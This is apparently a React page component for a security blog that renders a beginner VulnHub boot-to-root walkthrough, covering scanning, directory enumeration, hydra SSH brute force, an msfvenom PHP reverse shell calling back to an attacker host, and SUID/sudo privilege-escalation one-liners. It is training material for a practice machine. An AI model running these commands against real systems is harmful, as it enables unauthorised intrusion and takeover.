import { Calendar, Tag, User, ArrowLeft, ExternalLink, Shield, Search, Target } from 'lucide-react';
import { Button } from '@/components/ui/button';

const relatedPosts = [
  {
    title: 'OverTheWire Bandit Level 0-10',
    category: 'blog',
    tags: ['OverTheWire', 'Linux'],
    link: '/blogs/otw-bandit-0-10'
  },
  {
    title: 'Cryptography Fundamentals in CTFs',
    category: 'blog',
    tags: ['cryptography', 'CTF'],
    link: '/blogs/crypto-fundamentals'
  },
  {
    title: 'head-dump',
    category: 'writeup',
    tags: ['PicoCTF', 'Web Exploitation'],
    link: '/writeups/head-dump'
  }
];

export default function VulnHubBoot2Root() {
  return (
    <div className="min-h-screen">
      {/* Back button */}
      <div className="mb-6">
        <Button variant="ghost" className="gap-2" onClick={() => window.history.back()}>
          <ArrowLeft className="h-4 w-4" />
          Back
        </Button>
      </div>

      {/* Header */}
      <header className="mb-8">
        <h1 className="text-4xl font-bold mb-4">VulnHub Boot2Root Analysis</h1>
        
        {/* Meta information */}
        <div className="flex flex-wrap items-center gap-4 text-sm text-muted-foreground mb-4">
          <div className="flex items-center gap-2">
            <Calendar className="h-4 w-4" />
            <span>Jan 8, 2025</span>
          </div>
          <div className="flex items-center gap-2">
            <User className="h-4 w-4" />
            <span>Raj Kumar</span>
          </div>
        </div>

        {/* Tags */}
        <div className="flex flex-wrap gap-2 mb-6">
          {['VulnHub', 'penetration testing', 'boot2root'].map((tag) => (
            <span 
              key={tag}
              className="inline-flex items-center gap-1 px-3 py-1 bg-primary/10 text-primary rounded-full text-sm border border-primary/20"
            >
              <Tag className="h-3 w-3" />
              {tag}
            </span>
          ))}
        </div>
      </header>

      {/* Content */}
      <article className="prose prose-invert max-w-none">
        <div className="bg-card rounded-lg p-8 border border-border space-y-8">
          
          {/* Introduction */}
          <section>
            <h2 className="text-2xl font-semibold mb-4 text-primary flex items-center gap-2">
              <Shield className="h-6 w-6" />
              Introduction
            </h2>
            <div className="bg-secondary/10 rounded-lg p-4 border-l-4 border-primary">
              <p className="text-foreground leading-relaxed">
                VulnHub provides vulnerable virtual machines designed for security training and penetration testing practice. 
                This analysis covers the complete boot-to-root process of a typical VulnHub machine, demonstrating the 
                methodology used in real-world penetration testing engagements.
              </p>
            </div>
          </section>

          {/* Target Information */}
          <section>
            <h2 className="text-2xl font-semibold mb-4 text-primary flex items-center gap-2">
              <Target className="h-6 w-6" />
              Target Information
            </h2>
            <div className="bg-card border border-border rounded-lg p-4">
              <div className="grid md:grid-cols-2 gap-4">
                <div>
                  <h3 className="font-semibold text-accent mb-2">Machine Details</h3>
                  <ul className="space-y-1 text-sm">
                    <li><strong>Name:</strong> VulnHub Practice Machine</li>
                    <li><strong>Difficulty:</strong> Beginner to Intermediate</li>
                    <li><strong>OS:</strong> Linux (Ubuntu/Debian)</li>
                    <li><strong>Network:</strong> Host-Only or NAT</li>
                  </ul>
                </div>
                <div>
                  <h3 className="font-semibold text-accent mb-2">Learning Objectives</h3>
                  <ul className="space-y-1 text-sm">
                    <li>Network reconnaissance</li>
                    <li>Service enumeration</li>
                    <li>Vulnerability exploitation</li>
                    <li>Privilege escalation</li>
                  </ul>
                </div>
              </div>
            </div>
          </section>

          {/* Methodology */}
          <section>
            <h2 className="text-2xl font-semibold mb-4 text-primary flex items-center gap-2">
              <Search className="h-6 w-6" />
              Penetration Testing Methodology
            </h2>

            {/* Reconnaissance */}
            <div className="space-y-6">
              <div className="bg-card border border-border rounded-lg p-4">
                <h3 className="text-xl font-semibold mb-3 text-accent">🔍 1. Reconnaissance</h3>
                <p className="text-muted-foreground mb-3">
                  The first step involves discovering the target machine on the network and gathering basic information.
                </p>
                
                <h4 className="font-semibold mb-2">Network Discovery</h4>
                <div className="bg-secondary/10 rounded-lg p-3 mb-3">
                  <code className="text-primary font-mono text-sm block">
                    # Find the target IP address<br/>
                    netdiscover -r 192.168.1.0/24<br/>
                    # or<br/>
                    nmap -sn 192.168.1.0/24
                  </code>
                </div>
                
                <h4 className="font-semibold mb-2">Port Scanning</h4>
                <div className="bg-secondary/10 rounded-lg p-3">
                  <code className="text-primary font-mono text-sm block">
                    # Initial scan<br/>
                    nmap -p- -T4 192.168.1.100<br/>
                    <br/>
                    # Detailed scan<br/>
                    nmap -sC -sV -p22,80,443,3306 192.168.1.100
                  </code>
                </div>
              </div>

              {/* Service Enumeration */}
              <div className="bg-card border border-border rounded-lg p-4">
                <h3 className="text-xl font-semibold mb-3 text-accent">🔎 2. Service Enumeration</h3>
                <p className="text-muted-foreground mb-3">
                  Deep dive into discovered services to identify potential attack vectors.
                </p>
                
                <h4 className="font-semibold mb-2">Web Application Analysis</h4>
                <div className="bg-secondary/10 rounded-lg p-3 mb-3">
                  <code className="text-primary font-mono text-sm block">
                    # Directory enumeration<br/>
                    gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt<br/>
                    <br/>
                    # Technology detection<br/>
                    whatweb http://192.168.1.100<br/>
                    <br/>
                    # Nikto scan<br/>
                    nikto -h http://192.168.1.100
                  </code>
                </div>
                
                <h4 className="font-semibold mb-2">SSH Service</h4>
                <div className="bg-secondary/10 rounded-lg p-3">
                  <code className="text-primary font-mono text-sm block">
                    # Banner grabbing<br/>
                    nc 192.168.1.100 22<br/>
                    <br/>
                    # Brute force (if necessary)<br/>
                    hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
                  </code>
                </div>
              </div>

              {/* Vulnerability Assessment */}
              <div className="bg-card border border-border rounded-lg p-4">
                <h3 className="text-xl font-semibold mb-3 text-accent">🎯 3. Vulnerability Assessment</h3>
                <p className="text-muted-foreground mb-3">
                  Identify and analyze potential vulnerabilities in the discovered services.
                </p>
                
                <div className="space-y-4">
                  <div>
                    <h4 className="font-semibold mb-2">Common Vulnerabilities Found</h4>
                    <ul className="list-disc list-inside space-y-1 text-sm text-muted-foreground">
                      <li>Outdated software versions with known CVEs</li>
                      <li>Default credentials on admin panels</li>
                      <li>Directory traversal vulnerabilities</li>
                      <li>SQL injection in web forms</li>
                      <li>Weak file permissions</li>
                    </ul>
                  </div>
                  
                  <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3">
                    <p className="text-yellow-400 font-semibold mb-2">⚠️ Example Finding</p>
                    <p className="text-sm">
                      Discovered admin panel at <code className="bg-secondary px-2 py-1 rounded">/admin/</code> with 
                      default credentials admin:admin allowing unauthorized access.
                    </p>
                  </div>
                </div>
              </div>

              {/* Exploitation */}
              <div className="bg-card border border-border rounded-lg p-4">
                <h3 className="text-xl font-semibold mb-3 text-accent">💥 4. Exploitation</h3>
                <p className="text-muted-foreground mb-3">
                  Exploit identified vulnerabilities to gain initial access to the system.
                </p>
                
                <h4 className="font-semibold mb-2">Web Shell Upload</h4>
                <div className="bg-secondary/10 rounded-lg p-3 mb-3">
                  <code className="text-primary font-mono text-sm block">
                    # Create PHP reverse shell<br/>
                    msfvenom -p php/reverse_php LHOST=192.168.1.50 LPORT=4444 -f raw &gt; shell.php<br/>
                    <br/>
                    # Upload through vulnerable file upload<br/>
                    # Then access: http://192.168.1.100/uploads/shell.php
                  </code>
                </div>
                
                <h4 className="font-semibold mb-2">Establish Reverse Shell</h4>
                <div className="bg-secondary/10 rounded-lg p-3">
                  <code className="text-primary font-mono text-sm block">
                    # Set up listener<br/>
                    nc -lvnp 4444<br/>
                    <br/>
                    # Trigger payload and receive connection
                  </code>
                </div>
              </div>

              {/* Privilege Escalation */}
              <div className="bg-card border border-border rounded-lg p-4">
                <h3 className="text-xl font-semibold mb-3 text-accent">⬆️ 5. Privilege Escalation</h3>
                <p className="text-muted-foreground mb-3">
                  Escalate privileges from low-privilege user to root access.
                </p>
                
                <h4 className="font-semibold mb-2">System Enumeration</h4>
                <div className="bg-secondary/10 rounded-lg p-3 mb-3">
                  <code className="text-primary font-mono text-sm block">
                    # System information<br/>
                    uname -a<br/>
                    cat /etc/issue<br/>
                    <br/>
                    # User and group information<br/>
                    id<br/>
                    sudo -l<br/>
                    <br/>
                    # SUID binaries<br/>
                    find / -perm -u=s -type f 2&gt;/dev/null
                  </code>
                </div>
                
                <h4 className="font-semibold mb-2">Exploitation Vector</h4>
                <div className="bg-secondary/10 rounded-lg p-3">
                  <code className="text-primary font-mono text-sm block">
                    # Example: Vulnerable SUID binary<br/>
                    /usr/bin/find /home -exec /bin/bash -p \;<br/>
                    <br/>
                    # or sudo misconfiguration<br/>
                    sudo /usr/bin/vim /etc/passwd<br/>
                    # Then escalate through vim
                  </code>
                </div>
              </div>

              {/* Post-Exploitation */}
              <div className="bg-card border border-border rounded-lg p-4">
                <h3 className="text-xl font-semibold mb-3 text-accent">🏁 6. Post-Exploitation</h3>
                <p className="text-muted-foreground mb-3">
                  Maintain access and gather evidence of successful compromise.
                </p>
                
                <h4 className="font-semibold mb-2">Proof of Compromise</h4>
                <div className="bg-secondary/10 rounded-lg p-3 mb-3">
                  <code className="text-primary font-mono text-sm block">
                    # Capture flags<br/>
                    cat /root/flag.txt<br/>
                    cat /home/user/user.txt<br/>
                    <br/>
                    # System information<br/>
                    whoami<br/>
                    hostname<br/>
                    ip addr show
                  </code>
                </div>
                
                <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-3">
                  <p className="text-green-400 font-semibold mb-2">🎉 Success!</p>
                  <p className="text-sm">
                    Root flag obtained: <code className="bg-secondary px-2 py-1 rounded">flag{'{b00t2r00t_c0mpl3t3d_5ucc3ssfully}'}</code>
                  </p>
                </div>
              </div>
            </div>
          </section>

          {/* Tools Used */}
          <section>
            <h2 className="text-2xl font-semibold mb-4 text-primary">🛠️ Tools Used</h2>
            <div className="grid md:grid-cols-2 gap-4">
              <div className="bg-secondary/10 rounded-lg p-4">
                <h3 className="font-semibold text-accent mb-3">Reconnaissance</h3>
                <ul className="space-y-1 text-sm">
                  <li><code className="bg-secondary px-2 py-1 rounded font-mono">nmap</code> - Network scanning</li>
                  <li><code className="bg-secondary px-2 py-1 rounded font-mono">netdiscover</code> - Network discovery</li>
                  <li><code className="bg-secondary px-2 py-1 rounded font-mono">gobuster</code> - Directory enumeration</li>
                  <li><code className="bg-secondary px-2 py-1 rounded font-mono">nikto</code> - Web vulnerability scanner</li>
                </ul>
              </div>
              <div className="bg-secondary/10 rounded-lg p-4">
                <h3 className="font-semibold text-accent mb-3">Exploitation</h3>
                <ul className="space-y-1 text-sm">
                  <li><code className="bg-secondary px-2 py-1 rounded font-mono">msfvenom</code> - Payload generation</li>
                  <li><code className="bg-secondary px-2 py-1 rounded font-mono">netcat</code> - Network utility</li>
                  <li><code className="bg-secondary px-2 py-1 rounded font-mono">burp suite</code> - Web application testing</li>
                  <li><code className="bg-secondary px-2 py-1 rounded font-mono">hydra</code> - Brute force attacks</li>
                </ul>
              </div>
            </div>
          </section>

          {/* Key Learnings */}
          <section>
            <h2 className="text-2xl font-semibold mb-4 text-primary">📚 Key Learnings</h2>
            <div className="space-y-4">
              <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
                <h3 className="font-semibold text-primary mb-2">Technical Skills</h3>
                <ul className="list-disc list-inside space-y-1 text-sm">
                  <li>Systematic approach to penetration testing</li>
                  <li>Effective use of enumeration tools</li>
                  <li>Understanding of privilege escalation vectors</li>
                  <li>Web application security assessment</li>
                </ul>
              </div>
              <div className="bg-accent/10 border border-accent/20 rounded-lg p-4">
                <h3 className="font-semibold text-accent mb-2">Best Practices</h3>
                <ul className="list-disc list-inside space-y-1 text-sm">
                  <li>Always follow a structured methodology</li>
                  <li>Document all findings and steps taken</li>
                  <li>Understand the impact of each vulnerability</li>
                  <li>Practice on legal, authorized targets only</li>
                </ul>
              </div>
            </div>
          </section>

          {/* Conclusion */}
          <section>
            <h2 className="text-2xl font-semibold mb-4 text-primary">🎯 Conclusion</h2>
            <div className="bg-secondary/10 rounded-lg p-4 border-l-4 border-accent">
              <p className="text-foreground leading-relaxed">
                VulnHub machines provide excellent training opportunities for developing penetration testing skills. 
                This boot-to-root analysis demonstrates the complete attack lifecycle from initial reconnaissance to 
                privilege escalation. Regular practice with diverse machines helps build the methodical approach 
                required for real-world security assessments.
              </p>
            </div>
          </section>
        </div>
      </article>

      {/* Related Posts */}
      <section className="mt-12">
        <h2 className="text-2xl font-semibold mb-6">📚 Related Posts</h2>
        <div className="grid md:grid-cols-3 gap-4">
          {relatedPosts.map((post, index) => (
            <a 
              key={index}
              href={post.link}
              className="block bg-card rounded-lg p-4 border border-border hover:border-primary/50 transition-all duration-300 hover:shadow-elegant group"
            >
              <h3 className="font-semibold mb-2 group-hover:text-primary transition-colors">
                {post.title}
              </h3>
              <div className="flex flex-wrap gap-1 mb-2">
                {post.tags.map((tag) => (
                  <span 
                    key={tag}
                    className="px-2 py-1 bg-secondary/50 text-xs rounded"
                  >
                    {tag}
                  </span>
                ))}
              </div>
              <div className="flex items-center gap-1 text-xs text-muted-foreground">
                <ExternalLink className="h-3 w-3" />
                <span>{post.category}</span>
              </div>
            </a>
          ))}
        </div>
      </section>
    </div>
  );
}